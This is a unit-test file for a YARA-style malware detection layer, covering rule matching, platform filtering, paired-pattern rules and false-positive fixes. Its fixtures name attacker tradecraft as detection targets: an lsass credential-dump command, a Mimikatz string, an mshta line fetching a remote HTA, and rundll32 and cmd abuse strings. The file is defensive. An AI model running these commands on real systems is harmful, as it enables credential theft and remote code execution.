"""Unit tests for YaraLayer (src/maljan/analysis/yara_layer.py).

Tests cover:
  - YaraTTPRule.from_dict() construction and validation
  - YaraLayer construction from rule list
  - scan() — positive and negative matching
  - scan() — case-insensitive matching
  - scan() — multiple patterns from same rule
  - scan() — empty text / empty rule set
  - to_isr() — correct AgentISR structure
  - from_default_rules() — loads and returns valid layer
  - techniques_covered() — correct set
  - rule_count property
"""

from __future__ import annotations

import pytest

from maljan.analysis.yara_layer import YaraLayer, YaraTTPRule

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def sample_rules() -> list[YaraTTPRule]:
    return [
        YaraTTPRule(
            id="proc_injection",
            technique_id="T1055",
            confidence=0.88,
            description="Classic process injection indicators",
            patterns=("VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"),
        ),
        YaraTTPRule(
            id="ransomware_crypto",
            technique_id="T1486",
            confidence=0.85,
            description="Data encrypted for impact",
            patterns=("CryptEncrypt", "BCryptEncrypt"),
        ),
        YaraTTPRule(
            id="keylogger",
            technique_id="T1056.001",
            confidence=0.88,
            description="Keylogging via SetWindowsHookEx",
            patterns=("SetWindowsHookEx", "WH_KEYBOARD_LL"),
        ),
    ]


@pytest.fixture()
def yara_layer(sample_rules: list[YaraTTPRule]) -> YaraLayer:
    return YaraLayer(rules=sample_rules)


# ---------------------------------------------------------------------------
# YaraTTPRule
# ---------------------------------------------------------------------------


class TestYaraTTPRule:
    def test_from_dict_basic(self) -> None:
        rule = YaraTTPRule.from_dict(
            {
                "id": "test_rule",
                "technique_id": "T1055",
                "confidence": 0.85,
                "description": "Test rule",
                "patterns": ["VirtualAllocEx", "WriteProcessMemory"],
            }
        )
        assert rule.id == "test_rule"
        assert rule.technique_id == "T1055"
        assert rule.confidence == pytest.approx(0.85)
        assert "VirtualAllocEx" in rule.patterns

    def test_from_dict_confidence_floor(self) -> None:
        """Confidence below 0.70 is raised to the floor."""
        rule = YaraTTPRule.from_dict(
            {
                "id": "low_conf",
                "technique_id": "T1055",
                "confidence": 0.30,
                "description": "Low confidence rule",
                "patterns": ["pattern"],
            }
        )
        assert rule.confidence >= 0.70

    def test_from_dict_missing_confidence_defaults(self) -> None:
        rule = YaraTTPRule.from_dict({"id": "r", "technique_id": "T1055", "patterns": ["x"]})
        assert rule.confidence >= 0.70


# ---------------------------------------------------------------------------
# YaraLayer — construction
# ---------------------------------------------------------------------------


class TestYaraLayerConstruction:
    def test_rule_count(self, yara_layer: YaraLayer, sample_rules: list[YaraTTPRule]) -> None:
        assert yara_layer.rule_count == len(sample_rules)

    def test_techniques_covered(self, yara_layer: YaraLayer) -> None:
        covered = yara_layer.techniques_covered()
        assert "T1055" in covered
        assert "T1486" in covered
        assert "T1056.001" in covered

    def test_empty_rules_layer(self) -> None:
        layer = YaraLayer(rules=[])
        assert layer.rule_count == 0
        assert layer.techniques_covered() == set()

    def test_repr(self, yara_layer: YaraLayer) -> None:
        r = repr(yara_layer)
        assert "YaraLayer" in r
        assert "rules=" in r


# ---------------------------------------------------------------------------
# YaraLayer.scan()
# ---------------------------------------------------------------------------


class TestYaraLayerScan:
    def test_scan_positive_match(self, yara_layer: YaraLayer) -> None:
        text = "API call: VirtualAllocEx @ 0x401234"
        matches = yara_layer.scan(text)
        technique_ids = {m.technique_id for m in matches}
        assert "T1055" in technique_ids

    def test_scan_case_insensitive(self, yara_layer: YaraLayer) -> None:
        text = "api call: virtualAllocEx at offset 0x100"
        matches = yara_layer.scan(text)
        technique_ids = {m.technique_id for m in matches}
        assert "T1055" in technique_ids

    def test_scan_multiple_patterns_same_rule(self, yara_layer: YaraLayer) -> None:
        text = "VirtualAllocEx and WriteProcessMemory and CreateRemoteThread"
        matches = yara_layer.scan(text)
        t1055_matches = [m for m in matches if m.technique_id == "T1055"]
        assert len(t1055_matches) == 1  # one match per rule
        assert len(t1055_matches[0].matched_patterns) == 3

    def test_scan_no_match(self, yara_layer: YaraLayer) -> None:
        text = "benign program that does nothing suspicious"
        matches = yara_layer.scan(text)
        assert matches == []

    def test_scan_empty_text(self, yara_layer: YaraLayer) -> None:
        assert yara_layer.scan("") == []

    def test_scan_empty_rules(self) -> None:
        layer = YaraLayer(rules=[])
        assert layer.scan("VirtualAllocEx WriteProcessMemory") == []

    def test_scan_multiple_techniques(self, yara_layer: YaraLayer) -> None:
        text = "VirtualAllocEx detected, also CryptEncrypt and SetWindowsHookEx"
        matches = yara_layer.scan(text)
        technique_ids = {m.technique_id for m in matches}
        assert "T1055" in technique_ids
        assert "T1486" in technique_ids
        assert "T1056.001" in technique_ids

    def test_scan_returns_confidence(self, yara_layer: YaraLayer) -> None:
        text = "VirtualAllocEx detected"
        matches = yara_layer.scan(text)
        proc_match = next(m for m in matches if m.technique_id == "T1055")
        assert proc_match.confidence == pytest.approx(0.88)

    def test_scan_evidence_ref_format(self, yara_layer: YaraLayer) -> None:
        text = "VirtualAllocEx present in binary"
        matches = yara_layer.scan(text)
        proc_match = next(m for m in matches if m.technique_id == "T1055")
        ref = proc_match.evidence_ref
        assert "proc_injection" in ref
        assert "VirtualAllocEx" in ref

    def test_scan_claim_text_format(self, yara_layer: YaraLayer) -> None:
        text = "VirtualAllocEx present"
        matches = yara_layer.scan(text)
        proc_match = next(m for m in matches if m.technique_id == "T1055")
        assert "YARA" in proc_match.claim_text
        assert "proc_injection" in proc_match.claim_text

    def test_yara_and_regex_produce_same_matches(self, sample_rules: list) -> None:
        """When yara-python is available, its output must match the regex fallback."""
        from unittest.mock import patch

        text = "VirtualAllocEx and powershell.exe"

        # YARA engine path
        yara_layer = YaraLayer(sample_rules)
        yara_matches = yara_layer.scan(text)

        # Regex fallback path (mock yara unavailable)
        with (
            patch("maljan.analysis.yara_layer._YARA_AVAILABLE", False),
            patch("maljan.analysis.yara_layer.yara", None),
        ):
            regex_layer = YaraLayer(sample_rules)
            regex_matches = regex_layer.scan(text)

        assert len(yara_matches) == len(regex_matches)
        for ym, rm in zip(yara_matches, regex_matches, strict=False):
            assert ym.rule_id == rm.rule_id
            assert ym.technique_id == rm.technique_id
            assert ym.confidence == rm.confidence


# ---------------------------------------------------------------------------
# YaraLayer.from_default_rules()
# ---------------------------------------------------------------------------


class TestYaraLayerFromDefaultRules:
    def test_loads_without_error(self) -> None:
        """from_default_rules() must not raise, even if file is missing."""
        layer = YaraLayer.from_default_rules()
        assert isinstance(layer, YaraLayer)

    def test_default_rules_cover_key_techniques(self) -> None:
        """Default rule set must cover critical ATT&CK techniques."""
        layer = YaraLayer.from_default_rules()
        if layer.rule_count == 0:
            pytest.skip("Default rules file not found — skipping technique coverage test.")
        covered = layer.techniques_covered()
        required = {"T1055", "T1486", "T1003", "T1059.001", "T1547.001"}
        missing = required - covered
        assert not missing, f"Default rules missing critical techniques: {missing}"

    def test_default_rules_min_count(self) -> None:
        """Default rule set should have at least 30 rules."""
        layer = YaraLayer.from_default_rules()
        if layer.rule_count == 0:
            pytest.skip("Default rules file not found — skipping count test.")
        assert layer.rule_count >= 30


# ---------------------------------------------------------------------------
# Wave 4 — Platform-aware filtering
# ---------------------------------------------------------------------------


class TestYaraPlatformFiltering:
    """Wave 4: scan() should drop rules whose platform doesn't match the sample."""

    @pytest.fixture()
    def mixed_rules(self) -> list[YaraTTPRule]:
        return [
            YaraTTPRule(
                id="powershell_only",
                technique_id="T1059.001",
                confidence=0.85,
                description="PowerShell — windows only",
                patterns=("powershell.exe",),
                platform=("windows",),
            ),
            YaraTTPRule(
                id="ransomware_anywhere",
                technique_id="T1486",
                confidence=0.85,
                description="Ransomware indicators — cross-platform",
                patterns=("ransom",),
                platform=("any",),
            ),
        ]

    def test_drops_windows_rule_for_linux(self, mixed_rules: list[YaraTTPRule]) -> None:
        layer = YaraLayer(mixed_rules)
        text = "powershell.exe ransom"
        layer.reset_filter_stats()
        matches = layer.scan(text, sample_platform="linux")
        triggered = {m.rule_id for m in matches}
        # Foreign-OS (Windows-only) rule dropped; cross-platform rule survives.
        assert "powershell_only" not in triggered
        assert "ransomware_anywhere" in triggered
        assert layer.last_filtered_count == 1

    def test_keeps_windows_rule_for_windows(self, mixed_rules: list[YaraTTPRule]) -> None:
        layer = YaraLayer(mixed_rules)
        text = "powershell.exe ransom"
        layer.reset_filter_stats()
        matches = layer.scan(text, sample_platform="windows")
        triggered = {m.rule_id for m in matches}
        assert "powershell_only" in triggered
        assert "ransomware_anywhere" in triggered
        assert layer.last_filtered_count == 0

    def test_keeps_any_platform_rule_on_linux(self) -> None:
        """A YARA rule declared platform=any (e.g. sandbox_evasion) must survive
        platform-aware filtering on a supported sample — only OS-specific rules
        whose declared platform mismatches the sample are dropped."""
        layer = YaraLayer.from_default_rules()
        if layer.rule_count == 0:
            pytest.skip("Default rules file not found")
        # 2026-07 round 2: the bare "sandbox" pattern was dropped (FP source);
        # use a remaining VM-detection marker to exercise platform filtering.
        matches = layer.scan("checks for vmware and virtualbox artifacts", sample_platform="linux")
        triggered = {m.rule_id for m in matches}
        assert "sandbox_evasion" in triggered

    def test_legacy_no_platform_filter(self, mixed_rules: list[YaraTTPRule]) -> None:
        layer = YaraLayer(mixed_rules)
        text = "powershell.exe ransom"
        matches = layer.scan(text)  # no sample_platform → legacy path
        triggered = {m.rule_id for m in matches}
        assert "powershell_only" in triggered
        assert "ransomware_anywhere" in triggered

    def test_from_dict_default_platform_is_any(self) -> None:
        rule = YaraTTPRule.from_dict(
            {
                "id": "no_platform_specified",
                "technique_id": "T1055",
                "confidence": 0.85,
                "description": "Legacy rule with no platform field",
                "patterns": ["VirtualAllocEx"],
            }
        )
        assert rule.platform == ("any",)

    def test_from_dict_platform_list(self) -> None:
        rule = YaraTTPRule.from_dict(
            {
                "id": "windows_only",
                "technique_id": "T1059.001",
                "confidence": 0.85,
                "description": "PowerShell",
                "patterns": ["powershell.exe"],
                "platform": ["windows"],
            }
        )
        assert rule.platform == ("windows",)


# ---------------------------------------------------------------------------
# What the shipped rules fire on
# ---------------------------------------------------------------------------


# Strings a signed SSH client actually carries, in the shapes that made two
# shipped rules fire on it: the name of the API that writes a registry value,
# and the cipher and compression words in a transport implementation. Nothing
# here is a persistence key or a packer artefact.
_A_BENIGN_WINDOWS_CLIENT = (
    b"RegSetValueExA\x00RegCreateKeyExA\x00RegQueryValueExA\x00"
    b"aes256-ctr\x00aes192-cbc\x00AES-GCM\x00chacha20-poly1305\x00"
    b"zlib compression\x00compress packet\x00uPXfer window\x00"
    b"Software\\SimonTatham\\PuTTY\\Sessions\x00"
)

# The same two rules' real subjects: the Run key a persistence routine writes,
# and the section names a packer leaves behind.
_A_SAMPLE_THAT_PERSISTS = b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\x00svchost\x00"
_A_PACKED_SAMPLE = b"UPX0\x00UPX1\x00UPX!\x00This file is packed with the UPX\x00"


def _fired(data: bytes) -> set[str]:
    layer = YaraLayer.from_default_rules()
    if layer.rule_count == 0:
        pytest.skip("Default rules file not found.")
    return {match.rule_id for match in layer.scan(data, sample_platform="windows")}


def _asserted(data: bytes) -> dict[str, str]:
    """The techniques the corpus asserts on these bytes, by rule."""
    layer = YaraLayer.from_default_rules()
    if layer.rule_count == 0:
        pytest.skip("Default rules file not found.")
    return {
        match.rule_id: match.technique_id
        for match in layer.scan(data, sample_platform="windows")
        if match.technique_id
    }


class TestTheRunKeyRuleWantsARunKey:
    def test_the_name_of_the_api_is_not_persistence(self) -> None:
        """`RegSetValueEx` is how a program writes any value anywhere. The rule
        matched it on a signed SSH client and published T1547.001 at 0.88."""
        assert "registry_run_keys" not in _fired(_A_BENIGN_WINDOWS_CLIENT)

    def test_the_run_key_path_still_fires(self) -> None:
        assert "registry_run_keys" in _fired(_A_SAMPLE_THAT_PERSISTS)


class TestThePackingRulesWantAPackerArtefact:
    def test_a_cipher_name_and_a_compression_word_are_not_obfuscation(self) -> None:
        """Fourteen occurrences of `aes` and one `uPX` inside a longer word
        carried T1027 at 0.82 into a report about a benign binary."""
        fired = _fired(_A_BENIGN_WINDOWS_CLIENT)
        assert "obfuscation_indicators" not in fired
        assert "software_packing" not in fired

    def test_a_packer_section_name_still_fires(self) -> None:
        fired = _fired(_A_PACKED_SAMPLE)
        assert "obfuscation_indicators" in fired
        assert "software_packing" in fired


# Two benign fixtures, both built from names and words rather than from any
# sample's bytes. The first is the conservative one: API names a signed GUI
# network client imports and nothing else. The second adds the resource and
# interface strings such a program also carries.
_IMPORTED_NAMES = (
    b"RegSetValueExA\x00RegCreateKeyExA\x00RegQueryValueExA\x00RegDeleteKeyA\x00"
    b"CreateServiceW\x00StartServiceW\x00OpenSCManagerW\x00\x00"
    b"FindFirstFileW\x00FindNextFileW\x00GetLogicalDrives\x00GetDriveTypeW\x00"
    b"HttpSendRequestA\x00InternetOpenUrlA\x00WinHttpConnect\x00"
    b"IsDebuggerPresent\x00GetCursorPos\x00GetForegroundWindow\x00GetLastInputInfo\x00"
    b"ShellExecuteA\x00DllRegisterServer\x00CryptEncrypt\x00CryptDecrypt\x00"
    b"CreateObject\x00"
)
_WITH_INTERFACE_TEXT = _IMPORTED_NAMES + (
    b"Bitcoin address book\x00macroblock size\x00create a shortcut\x00"
    b"scrollbar.png\x00encrypt the session\x00Decrypt failed\x00"
    b"zlib compression\x00compress packet\x00AES-GCM\x00%COMSPEC%\x00"
    b"aes256-ctr\x00uPXfer window\x00Software\\SimonTatham\\PuTTY\\Sessions\x00"
)


class TestTheCorpusAssertsNothingAboutABenignClient:
    """Every rule in the file, over a benign GUI network client.

    Thirteen rules used to fire on one: a pattern that is a substring of a
    benign API name (`RegSetValue`, `CreateService`, `ExecuteA`), a pattern
    that is an English word (`encrypt`, `macro`, `shortcut`), a pattern too
    short to be evidence (`#24` at 0.91), and a pattern the MSVC CRT links in
    (`IsDebuggerPresent`). Each carried a technique and an authored confidence
    into the pack every agent reads.
    """

    def test_the_api_names_alone_assert_no_technique(self) -> None:
        assert _asserted(_IMPORTED_NAMES) == {}

    def test_the_interface_strings_assert_no_technique(self) -> None:
        assert _asserted(_WITH_INTERFACE_TEXT) == {}

    def test_what_still_fires_says_so_without_a_technique(self) -> None:
        """The notes are allowed to fire — they name what is there and claim
        nothing — and they carry no confidence to be read as one."""
        layer = YaraLayer.from_default_rules()
        if layer.rule_count == 0:
            pytest.skip("Default rules file not found.")
        for match in layer.scan(_WITH_INTERFACE_TEXT, sample_platform="windows"):
            assert match.technique_id == ""
            assert match.confidence is None


class TestEachTightenedRuleStillFiresOnItsArtefact:
    ARTEFACTS = [
        ("registry_run_keys", b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\x00"),
        ("obfuscation_indicators", b"UPX0\x00UPX1\x00UPX!\x00"),
        ("software_packing", b"UPX0\x00UPX1\x00"),
        ("registry_modification", b"Software\\Policies\\System\\EnableLUA\x00"),
        ("sandbox_evasion", b"CheckRemoteDebuggerPresent\x00vboxservice\x00"),
        ("lsass_dump", b"sekurlsa::logonpasswords\x00"),
        ("lsass_dump", b"comsvcs.dll MiniDump 624 C:\\out.dmp full\x00"),
        ("lsass_dump", b"MiniDumpWriteDump\x00lsass.exe\x00"),
        ("rundll32_abuse", b'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"\x00'),
        ("mshta_abuse", b"mshta http://198.51.100.9/a.hta\x00"),
        ("ransomware_indicators", b"ALL YOUR FILES ARE ENCRYPTED\x00_readme.txt\x00"),
        ("phishing_attachment", b"AutoOpen\x00vbaProject.bin\x00"),
        ("cmd_execution", b"cmd.exe /c start payload\x00"),
        ("vbs_execution", b"WScript.Shell\x00cscript.exe\x00"),
    ]

    @pytest.mark.parametrize(("rule_id", "artefact"), ARTEFACTS)
    def test_the_artefact_still_fires_the_rule(self, rule_id: str, artefact: bytes) -> None:
        assert rule_id in _fired(artefact)

    @pytest.mark.parametrize(("rule_id", "artefact"), ARTEFACTS)
    def test_the_rule_still_carries_its_technique(self, rule_id: str, artefact: bytes) -> None:
        assert _asserted(artefact).get(rule_id)


class TestATechniqueThatIsAPairNeedsBothHalves:
    """`MiniDumpWriteDump` is in a crash reporter and `lsass.exe` is in every
    process lister. Either alone carried T1003.001 at 0.91 — the highest
    authored confidence in the file."""

    def test_the_dump_call_alone_asserts_nothing(self) -> None:
        blob = b"MiniDumpWriteDump\x00DbgHelp.dll\x00CreateDumpFile\x00"
        assert _asserted(blob) == {}
        assert "process_dump_apis" in _fired(blob)

    def test_the_image_name_alone_asserts_nothing(self) -> None:
        blob = b"lsass.exe\x00csrss.exe\x00services.exe\x00EnumProcesses\x00"
        assert _asserted(blob) == {}
        assert "process_dump_apis" in _fired(blob)

    def test_both_together_assert_the_technique(self) -> None:
        assert _asserted(b"MiniDumpWriteDump\x00lsass.exe\x00").get("lsass_dump") == "T1003.001"

    def test_the_mimikatz_string_still_asserts_on_its_own(self) -> None:
        assert _asserted(b"sekurlsa::logonpasswords\x00").get("lsass_dump") == "T1003.001"


class TestAnExtensionIsNotARenaming:
    """What makes an extension evidence is the renaming, which the rule file
    cannot express across two groups; so the extensions observe and the note
    wordings assert."""

    def test_an_ordinary_file_name_asserts_nothing(self) -> None:
        for blob in (
            b"C:\\Users\\a\\Documents\\notes.encrypted\x00",
            b"vault backup.locked\x00",
            b"archive.crypt\x00",
        ):
            assert _asserted(blob) == {}
            assert "encrypted_file_extensions" in _fired(blob)

    def test_a_ransom_note_still_asserts(self) -> None:
        blob = b"ALL YOUR FILES ARE ENCRYPTED\x00_readme.txt\x00"
        assert _asserted(blob).get("ransomware_indicators") == "T1486"

    def test_a_tor_address_is_not_a_ransomware_extension(self) -> None:
        """`.onion` was in the extension list, so every hidden-service address
        in any sample read as ransomware."""
        assert _fired(b"expyuzz4wqqyqhjn.onion\x00") == set()


class TestTheTogetherGroupInTheRuleFile:
    def test_a_rule_reads_its_all_of_group(self) -> None:
        rule = YaraTTPRule.from_dict(
            {
                "id": "pair",
                "technique_id": "T1003.001",
                "confidence": 0.9,
                "description": "a pair",
                "patterns": ["alone"],
                "all_of": ["first", "second"],
            }
        )
        assert rule.all_of == ("first", "second")

    def test_a_rule_without_one_has_an_empty_group(self) -> None:
        rule = YaraTTPRule.from_dict(
            {
                "id": "single",
                "technique_id": "T1055",
                "confidence": 0.9,
                "description": "one",
                "patterns": ["alone"],
            }
        )
        assert rule.all_of == ()

    def test_the_regex_fallback_agrees_with_the_compiled_engine(self) -> None:
        """A host without yara-python must reach the same answer."""
        rules = [
            YaraTTPRule.from_dict(
                {
                    "id": "pair",
                    "technique_id": "T1003.001",
                    "confidence": 0.9,
                    "description": "a pair",
                    "patterns": [],
                    "all_of": ["first", "second"],
                }
            )
        ]
        from unittest.mock import patch

        compiled = YaraLayer(rules)
        with (
            patch("maljan.analysis.yara_layer._YARA_AVAILABLE", False),
            patch("maljan.analysis.yara_layer.yara", None),
        ):
            fallback = YaraLayer(rules)
        for layer in (compiled, fallback):
            assert layer.scan(b"first only") == []
            fired = layer.scan(b"first and second")
            assert [m.rule_id for m in fired] == ["pair"]
        assert set(fallback.scan(b"first and second")[0].matched_patterns) == {
            "first",
            "second",
        }


class TestOneFallbackMatcherForTheRuleFile:
    """Two code paths read the same rule file without yara-python.

    The layer's own fallback and the one `yara_scan` uses — which is the path
    the triage pack calls — disagreed about `all_of`: the tool's copy iterated
    the ordinary patterns only, so on a host without yara-python the pair form
    of a rule could not fire at all while the layer fired it.
    """

    def _yaraless(self, rules: list[YaraTTPRule]) -> YaraLayer:
        from unittest.mock import patch

        with (
            patch("maljan.analysis.yara_layer._YARA_AVAILABLE", False),
            patch("maljan.analysis.yara_layer.yara", None),
        ):
            return YaraLayer(rules)

    def _both(self, layer: YaraLayer, blob: bytes) -> tuple[set[str], set[str]]:
        from maljan.tools.rules import _yara_regex_matches

        theirs = {row["rule"] for row in _yara_regex_matches(layer, blob)}
        mine = {match.rule_id for match in layer.scan(blob)}
        return theirs, mine

    SHAPES = [
        ("neither half", b"nothing of interest here"),
        ("one half", b"ALPHA on its own"),
        ("the other half", b"BETA on its own"),
        ("both halves", b"ALPHA and BETA together"),
        ("the specific form", b"SPECIFIC_FORM on its own"),
        ("specific and one half", b"SPECIFIC_FORM with ALPHA"),
        ("the plain rule", b"PLAIN string"),
        ("the pair in another case", b"alpha and beta"),
    ]

    def _mixed_rules(self) -> list[YaraTTPRule]:
        return [
            YaraTTPRule.from_dict(
                {
                    "id": "pair_only",
                    "technique_id": "T1003.001",
                    "confidence": 0.9,
                    "description": "a pair",
                    "patterns": [],
                    "all_of": ["ALPHA", "BETA"],
                }
            ),
            YaraTTPRule.from_dict(
                {
                    "id": "mixed",
                    "technique_id": "T1055",
                    "confidence": 0.9,
                    "description": "one on its own, or a pair",
                    "patterns": ["SPECIFIC_FORM"],
                    "all_of": ["ALPHA", "BETA"],
                }
            ),
            YaraTTPRule.from_dict(
                {
                    "id": "plain",
                    "technique_id": "T1059",
                    "confidence": 0.9,
                    "description": "one string",
                    "patterns": ["PLAIN"],
                }
            ),
        ]

    @pytest.mark.parametrize(("label", "blob"), SHAPES)
    def test_the_two_fallbacks_agree_on_the_mixed_shapes(self, label: str, blob: bytes) -> None:
        layer = self._yaraless(self._mixed_rules())
        theirs, mine = self._both(layer, blob)
        assert theirs == mine, label

    def test_the_two_fallbacks_agree_over_every_rule_in_the_shipped_file(self) -> None:
        from maljan.analysis.yara_layer import _DEFAULT_RULES_PATH

        if not _DEFAULT_RULES_PATH.exists():
            pytest.skip("Default rules file not found.")
        shipped = YaraLayer.from_yaml(_DEFAULT_RULES_PATH)
        layer = self._yaraless(list(shipped._rules))
        for blob in (
            b"MiniDumpWriteDump\x00lsass.exe\x00",
            b"MiniDumpWriteDump\x00",
            b"lsass.exe\x00",
            b"sekurlsa::logonpasswords\x00",
            b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\x00",
            b"UPX0\x00UPX1\x00",
            b"nothing at all\x00",
        ):
            theirs, mine = self._both(layer, blob)
            assert theirs == mine, blob

    def test_the_pair_fires_for_the_tool_too(self) -> None:
        from maljan.analysis.yara_layer import _DEFAULT_RULES_PATH

        if not _DEFAULT_RULES_PATH.exists():
            pytest.skip("Default rules file not found.")
        layer = self._yaraless(list(YaraLayer.from_yaml(_DEFAULT_RULES_PATH)._rules))
        theirs, _mine = self._both(layer, b"MiniDumpWriteDump\x00lsass.exe\x00")
        assert "lsass_dump" in theirs


class TestNeitherEngineCallsHalfAPairEvidence:
    def test_the_matched_strings_agree_on_the_shipped_mixed_rule(self) -> None:
        """A half-matched group must not be listed as one of the strings that
        fired the rule, whichever engine answered."""
        from unittest.mock import patch

        from maljan.analysis.yara_layer import _DEFAULT_RULES_PATH

        if not _DEFAULT_RULES_PATH.exists():
            pytest.skip("Default rules file not found.")
        rules = list(YaraLayer.from_yaml(_DEFAULT_RULES_PATH)._rules)
        compiled = YaraLayer(rules)
        if compiled._yara_rules is None:
            pytest.skip("yara-python is not installed; there is only one engine here.")
        with (
            patch("maljan.analysis.yara_layer._YARA_AVAILABLE", False),
            patch("maljan.analysis.yara_layer.yara", None),
        ):
            fallback = YaraLayer(rules)

        blob = b"sekurlsa::logonpasswords\x00lsass.exe\x00"
        by_engine = []
        for layer in (compiled, fallback):
            fired = [m for m in layer.scan(blob, sample_platform="windows")]
            hit = next(m for m in fired if m.rule_id == "lsass_dump")
            by_engine.append({p.lower() for p in hit.matched_patterns})
        assert "lsass.exe" not in by_engine[0]
        assert by_engine[0] == by_engine[1]
